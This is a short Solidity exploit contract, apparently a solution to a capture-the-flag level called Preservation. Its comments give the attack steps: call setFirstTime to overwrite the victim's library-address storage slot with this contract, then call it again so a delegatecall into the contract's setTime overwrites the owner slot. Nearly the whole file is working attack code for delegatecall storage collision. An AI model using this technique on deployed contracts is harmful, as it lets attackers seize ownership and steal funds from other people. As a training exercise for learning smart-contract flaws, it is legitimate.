// deploy that contract , call setFirstTime of instance to change storage slot #1 (timeZone1Library)
// call setFirstTime again, go into that contract and change storage slot #3 owner 
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

contract Preservation {

  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;

  function setTime(uint player) public {
        owner = address(uint160(player));
  }
}
